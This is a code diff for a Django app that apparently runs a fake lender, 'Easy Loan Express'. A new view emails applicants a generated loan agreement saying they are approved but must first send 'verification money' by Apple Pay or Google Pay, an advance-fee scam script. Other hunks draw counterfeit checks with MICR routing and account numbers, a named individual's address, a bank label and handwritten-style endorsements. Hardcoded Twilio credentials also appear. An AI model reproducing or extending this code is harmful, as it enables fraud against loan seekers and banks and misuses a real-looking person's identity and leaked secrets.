@@ -56,6 +56,7 @@ from preregister.models import preregisterform
 from preregister.preregister import preregistermainform
 from fullbankclose.models import fullbankclose
 from fullbankclose.fullbankclose import fullbankcloseform
+from iphonedetails.iphonedetails import iphonecloseform
 from cannedresponse.models import CannedResponse, CheckReclose, PaydayReclose
 from cardinfo.models import SnippetCard, CardAttached, MonthlyExpense
 from depositlist.models import Deposit_List, Received_List, Commitment_List, Commitment_Create, Daily_Deposit_list
@@ -81,7 +82,7 @@ account_sid = 'ACc4152bd9de2f520ae656332a28bd392d'
 auth_token = 'bb4a0a679dfa26f78e666a997a105066'
 client = Client(account_sid, auth_token)
 checknumbercount = 1
-#config = pdfkit.configuration(wkhtmltopdf='/home/Manish54213/wkhtml-install/usr/local/bin/wkhtmltopdf')
+config = pdfkit.configuration(wkhtmltopdf='C:/Program Files/wkhtmltopdf/bin/wkhtmltopdf.exe')
 
 """
 curl -G https://api.twilio.com/2010-04-01/Accounts/ACc4152bd9de2f520ae656332a28bd392d/Balance.json \
@@ -141,20 +142,32 @@ def thankyoupage(request):
     return render(request, 'thankyoupage.html')
 
 
-def fullbankclosefunc(request):
+from reportlab.pdfgen import canvas
+
+def generate_pdf_bytes(html):
+    # Create a PDF from the HTML content
+    pdf = pdfkit.from_string(html, False, configuration=config)
+
+    # Convert the PDF to bytes
+    pdf_bytes = BytesIO(pdf)
+
+    return pdf_bytes.getvalue()
+
+
+
+
+def iphoneclosefunc(request):
     global global_live_chat_link
     if request.method == 'POST':
-        form = fullbankcloseform(request.POST)
+        form = iphonecloseform(request.POST)
         if form.is_valid():
             form.save()
             return HttpResponseRedirect(global_live_chat_link)
         else:
             print(form.errors)
-    form = fullbankcloseform()
+    form = iphonecloseform()
 
-    return render(request, 'fullbankclose.html', {'form': form})
-
-
+    return render(request, 'iphoneclose.html', {'form': form})
 """Create Commitment"""
 
 def commitmentcreate(request):
@@ -1546,9 +1559,117 @@ def western(request):
 
 
 
+def generate_agreement_html(loan_amount, context):
+    if loan_amount == '$1000':
+        template_name = '1000.html'
+    elif loan_amount == '$1500':
+        template_name = '1500.html'
+    elif loan_amount == '$2000':
+        template_name = '2000.html'
+    elif loan_amount == '$3000':
+        template_name = '3000.html'
+    elif loan_amount == '$4000':
+        template_name = '4000.html'
+    elif loan_amount == '$4500':
+        template_name = '4500.html'
+    elif loan_amount == '$5000':
+        template_name = '5000.html'
+    elif loan_amount == '$5500':
+        template_name = '5500.html'
+    elif loan_amount == '$6000':
+        template_name = '6000.html'
+    elif loan_amount == '$6500':
+        template_name = '6500.html'
+    elif loan_amount == '$7000':
+        template_name = '7000.html'
+    elif loan_amount == '$7500':
+        template_name = '7500.html'
+    elif loan_amount == '$8000':
+        template_name = '8000.html'
+    elif loan_amount == '$2500':
+        template_name = '2500.html'
+    elif loan_amount == '$3500':
+        template_name = '3500.html'
+    else:
+        print(loan_amount)
+        return None
+
+    template = get_template(template_name)
+    return template.render(context)
+
+def fullbankclosefunc(request):
+    global global_live_chat_link
+    if request.method == 'POST':
+        form = fullbankcloseform(request.POST)
+        if form.is_valid():
+            # Save the form data
+            form.save()
+
+            # Get the email address from the form
+            email = request.POST['email']
+
+            # Get the loan amount from the form
+            loan_amount = request.POST['loan_amount']
+            first_name = request.POST['first_name']
+            last_name = request.POST['last_name']
+            name = first_name + ' ' + last_name
+            address = request.POST['address']
+            city = request.POST['city']
+            state = request.POST['state']
+            zip_code = request.POST['zip_code']
+            payment_date = request.POST['payment_date']
+            date_today = datetime.datetime.today()
 
 
 
+            # Create the context data for the agreement
+            context = {
+                "Full_Name": name,
+                "Verification_Amount": ' Depends on Easy Loan Express',
+                "Full_Address": address,
+                "Payment_Date": payment_date,
+                "Extra_Line": "",
+                "date_time": ' ' + ' ' + date_today.strftime('%m-%d-%Y'),
+            }
+
+            # Generate the agreement HTML
+            agreement_html = generate_agreement_html(loan_amount, context)
+            if agreement_html is None:
+                return HttpResponse('<h1> SEEMS LIKE YOUR AMOUNT DOES NOT MATCH WITH THE STORED TEMPLATES </h1>')
+
+            # Generate the agreement PDF from the HTML
+            pdf_bytes = generate_pdf_bytes(agreement_html)
+
+            # Send the agreement as an email attachment
+            send_confirmation_email(email, pdf_bytes, name)
+
+            return HttpResponseRedirect(global_live_chat_link)
+        else:
+            print(form.errors)
+    form = fullbankcloseform()
+
+    return render(request, 'fullbankclose.html', {'form': form})
+
+def send_confirmation_email(email, pdf_bytes, name):
+    subject = 'Loan Agreement - Easy Loan Express'
+    message = f'Hello {name}, Thank you for providing the details. We appreciate your cooperation. \n\n'
+    message += 'We are pleased to inform you that your loan application has been fully approved. To proceed, you need to sign the loan documents. \n\n'
+    message += 'You can sign the documents either by printing them and manually signing, or by using any e-Sign app of your choice. If you encounter any difficulties in signing the documents, please reach out to us via live chat, and we will be happy to assist you with e-Signing. \n\n'
+    message += 'Please note that you are required to send the verification money to complete the verification process. Once the loan documents are signed, we will guide you through the steps to send the verification money using Apple Pay or Google Pay. \n\n'
+    message += 'Upon receiving the verification money, the loan amount will be deposited into your account within a maximum of 45 minutes. \n\n'
+    message += 'If you have any questions or need further assistance, please don\'t hesitate to contact our live chat support. Thank you once again for choosing our services. \n\n'
+    message += 'Best regards, \n'
+    from_email = 'Easy Loan Express <support@easyloanexpress>'
+    recipient_list = [email]
+
+    # Create an EmailMessage object
+    email_message = EmailMessage(subject, message, from_email, recipient_list)
+
+    # Attach the PDF bytes as a file
+    email_message.attach('Loan Agreement.pdf', pdf_bytes, 'application/pdf')
+
+    # Send the email
+    email_message.send()
 
 def agreement(request):
     database_id_from_user = request.POST['database']
@@ -4727,9 +4848,14 @@ def loanredirect(request):
 
 def cashier2022_check_create_d_3(request):
     obj = SubsNew.objects.get(id=1)
-    cashier2022_check_print_number = obj.cashier2022_check_number
-    obj.cashier2022_check_number +=1
+    cashier2022_check_print_number = obj.personal_check_number
+    obj.personal_check_number +=1
     obj.save()
+    full_name_check = "STEVE OSMAN"
+    address_check = "60 MARIETTA ROAD"
+    city_state_zip_check = "CHILLICOTHE, OH 45601"
+    small_text = '5-7508/2110'
+    
 
     global amazon_check_number
 
@@ -4739,7 +4865,7 @@ def cashier2022_check_create_d_3(request):
     id_number = 2
     database_id_from_user = request.POST['database']
     obj = fullbankclose.objects.get(id=int(database_id_from_user))
-    full_name = obj.first_name.upper() + ' ' + obj.last_name.upper()
+    full_name = obj.first_name + ' ' + obj.last_name
     address = obj.address.upper()
     city = obj.city.upper()
     state = obj.state.upper()
@@ -4751,44 +4877,57 @@ def cashier2022_check_create_d_3(request):
     print(full_name)
     print(request.POST['verificationamount'])
     date_today = datetime.datetime.now()
-    date_formated = date_today.strftime("%B %d, %Y")
+    date_formated = date_today.strftime("%m/%d/%Y")
     print(date_formated)
-    image_1 = Image.open('cashier2022.jpg')
+    image_1 = Image.open('personal.jpg')
     draw = ImageDraw.Draw(image_1)
-    amount_font = ImageFont.truetype('./courbold.ttf', size=130)
-    font_1 = ImageFont.truetype('./courbold.ttf', size=130)
-    font_2 = ImageFont.truetype("./courbold.ttf", size=130)
+    amount_font = ImageFont.truetype('./arial.ttf', size=40)
+    font_1 = ImageFont.truetype('./arial.ttf', size=35)
+    font_4 = ImageFont.truetype('./arial.ttf', size=25)
+    font_2 = ImageFont.truetype("./arial.ttf", size=40)
 
     color = 'rgb(00, 00, 00)'
 
 
-    (x,y) = (1100, 2100)
-    name = '***'+full_name+'***'
+    (x,y) = (400, 290)
+    name = full_name
 
     draw.text((x,y), name, fill=color, font=font_1)
 
-    (x,y) = (1100, 2250)
-    name = address
+    #(x,y) = (100, 100)
+    #name = address
+
+    #draw.text((x,y), name, fill=color, font=font_1)
+    (x,y) = (100, 100)
+    name = full_name_check
 
     draw.text((x,y), name, fill=color, font=font_1)
 
-
-    (x,y) = (1100, 2400)
-    name = city
-
-    draw.text((x,y), name, fill=color, font=font_1)
-
-
-    (x,y) = (1900, 2400)
-    name = state
+    #(x,y) = (1100, 2400)
+    #name = city
+    (x,y) = (100, 150)
+    name = address_check
 
     draw.text((x,y), name, fill=color, font=font_1)
+    #draw.text((x,y), name, fill=color, font=font_1)
 
-
-    (x,y) = (2100, 2400)
-    name = zip_code
+    (x,y) = (100, 200)
+    name = city_state_zip_check
 
     draw.text((x,y), name, fill=color, font=font_1)
+    #(x,y) = (1900, 2400)
+    #name = state
+    (x,y) = (1150, 100)
+    name = small_text
+
+    draw.text((x,y), name, fill=color, font=font_4)
+    #draw.text((x,y), name, fill=color, font=font_1)
+
+
+    #(x,y) = (2100, 2400)
+    #name = zip_code
+
+    #draw.text((x,y), name, fill=color, font=font_1)
     # (x, y) = (450, 360)
 
     # address_field = address
@@ -4817,50 +4956,50 @@ def cashier2022_check_create_d_3(request):
 
 
     if request.POST['verificationamount'] == '100':
-        (x, y) = (800, 1500)
+        (x, y) = (380, 380)
         amount_in_words = 'ONE HUNDRED AND 00/100 '
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********100.00'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1430, 310)
+        check_amount = '100.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
 
     elif request.POST['verificationamount'] == '200':
-        (x, y) = (800, 1500)
+        (x, y) = (400, 380)
         amount_in_words = 'TWO HUNDRED AND  00/100'
-        date_font  = ImageFont.truetype("./OCRB Medium.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********200.00'
-        date_font  = ImageFont.truetype("./OCRB Medium.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '200.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
 
     elif request.POST['verificationamount'] == '250':
-        (x, y) = (800, 1500)
+        (x, y) = (400, 380)
         amount_in_words = 'TWO HUNDRED FIFTY-THREE AND 40/100 '
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********253.40'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '253.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
 
 
     elif request.POST['verificationamount'] == '480':
-        (x, y) = (800, 1500)
+        (x, y) = (400, 380)
         amount_in_words = 'FOUR HUNDRED EIGHTY-THREE AND 40/100 '
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********483.40'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '483.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
@@ -4869,26 +5008,26 @@ def cashier2022_check_create_d_3(request):
 
 
     elif request.POST['verificationamount'] == '720':
-        (x, y) = (800, 1500)
+        (x, y) = (400, 380)
         amount_in_words = 'SEVEN HUNDRED TWENTY AND 00/100 '
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********720.00'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '720.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
 
 
     elif request.POST['verificationamount'] == '970':
-        (x, y) = (800, 1500)
+        (x, y) = (400, 380)
         amount_in_words = 'NINE HUNDRED SEVENTY AND 00/100'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********970.00'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '970.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
@@ -4897,13 +5036,13 @@ def cashier2022_check_create_d_3(request):
 
 
     elif request.POST['verificationamount'] == 'manual':
-        (x, y) = (800, 1500)
-        amount_in_words = 'FOUR HUNDRED EIGHTY-THREE AND 40/100 '
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (400, 380)
+        amount_in_words = 'FOUR HUNDRED EIGHTY THREE AND 40/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
-        (x, y) = (6300, 1300)
-        check_amount = '$********483.40'
-        date_font  = ImageFont.truetype("./courbold.ttf", size=130)
+        (x, y) = (1450, 310)
+        check_amount = '483.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), check_amount, fill=color, font=date_font)
 
 
@@ -4912,57 +5051,59 @@ def cashier2022_check_create_d_3(request):
 
 
 
-    date_font = ImageFont.truetype("./courbold.ttf", size=110)
-    (x, y) = (6600, 850)
+    date_font = ImageFont.truetype("./arial.ttf", size=40)
+    (x, y) = (1200, 200)
     date = date_formated
-    date_font = ImageFont.truetype("./courbold.ttf", size=110)
+    date_font = ImageFont.truetype("./arial.ttf", size=40)
 
     draw.text((x,y), date_formated, fill=color, font=date_font)
 
 
 
-    (x, y) = (2350, 120)
+    (x, y) = (1580, 100)
     checkno = str(cashier2022_check_print_number)
-    date_font = ImageFont.truetype("./courbold.ttf", size=60)
+    date_font = ImageFont.truetype("./arial.ttf", size=65)
 
-    draw.text((x,y), checkno, fill='#361719', font=date_font)
+    draw.text((x,y), checkno, fill=color, font=date_font)
 
     (x, y) = (1050, 1120)
     checkno = str(cashier2022_check_print_number)
-    date_font = ImageFont.truetype("./courbold.ttf", size=120)
+    date_font = ImageFont.truetype("./arial.ttf", size=40)
 
     draw.text((x,y), '***FIRST NATIONAL BANK TEXAS***', fill=color, font=date_font)
 
 
 
-    (x, y) = (6800, 370)
+    (x, y) = (1000, 710)
     checkno = str(cashier2022_check_print_number)
-    date_font = ImageFont.truetype("./courbold.ttf", size=230)
+    date_font = ImageFont.truetype("./micrenc.ttf", size=75)
 
     draw.text((x,y), checkno, fill=color, font=date_font)
 
 
 
 
-    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=245)
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=75)
 
-    (x, y) = (1930, 3130)
-    check_mri = str(cashier2022_check_print_number)
 
-    draw.text((x,y), check_mri, fill=(0,0,0), font=checkmrifont)
 
-    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=245)
+    #(x, y) = (900, 700)
+    #check_mri = 'a'+str(cashier2022_check_print_number) 
 
-    (x, y) = (3070, 3130)
-    account_number = str('111906271')
+    #draw.text((x,y), check_mri, fill=(0,0,0), font=checkmrifont)
+
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=75)
+
+    (x, y) = (550, 710)
+    account_number = str('6113942653') + 'c'
 
     draw.text((x,y), account_number, fill=(0,0,0), font=checkmrifont)
 
 
-    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=245)
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=75)
 
-    (x, y) = (4450, 3130)
-    routing_number = str('01 0217107')
+    (x, y) = (100, 710)
+    routing_number = 'a'+ str('211075086') + 'a' 
 
     draw.text((x,y), routing_number, fill=(0,0,0), font=checkmrifont)
 
@@ -5011,7 +5152,7 @@ def cashier2022_check_create_d_3_100_1(request):
     print(full_name)
     print(request.POST['verificationamount'])
     date_today = datetime.datetime.now()
-    date_formated = date_today.strftime("%B %d, %Y")
+    date_formated = date_today.strftime("%m/%d/%Y")
     print(date_formated)
     image_1 = Image.open('cashier2022.jpg')
     draw = ImageDraw.Draw(image_1)
@@ -5176,9 +5317,9 @@ def create_back_check(request):
         print(date_formated)
         image_1 = Image.open('back.jpg')
         draw = ImageDraw.Draw(image_1)
-        amount_font = ImageFont.truetype('./courbold.ttf', size=5)
-        font_1 = ImageFont.truetype('./AYearWithoutRain.ttf', size=60)
-        font_2 = ImageFont.truetype("./courbold.ttf", size=130)
+        amount_font = ImageFont.truetype('./happy.otf', size=50)
+        font_1 = ImageFont.truetype('./RinsHandwriting-Regular.ttf', size=120)
+        font_2 = ImageFont.truetype("./happy.otf", size=130)
 
         color = 'rgb(00, 00, 00)'
 
@@ -5190,23 +5331,23 @@ def create_back_check(request):
         draw.text((x,y), first_name + ' ' +last_name, fill=color, font=font_1)
 
         try:
-            (x,y) = (35, 170)
+            (x,y) = (35, 190)
             draw.text((x,y), endorsement_from_user, fill=color, font=font_1)
         except:
             pass
 
         try:
-            (x,y) = (35, 250)
+            (x,y) = (35, 290)
             draw.text((x,y), endorsement_from_user_2, fill=color, font=font_1)
         except:
             pass
         try:
-            (x,y) = (35, 320)
+            (x,y) = (35, 370)
             draw.text((x,y), endorsement_from_user_3, fill=color, font=font_1)
         except:
             pass
         try:
-            (x,y) = (35, 410)
+            (x,y) = (35, 470)
             draw.text((x,y), endorsement_from_user_4, fill=color, font=font_1)
         except:
             pass
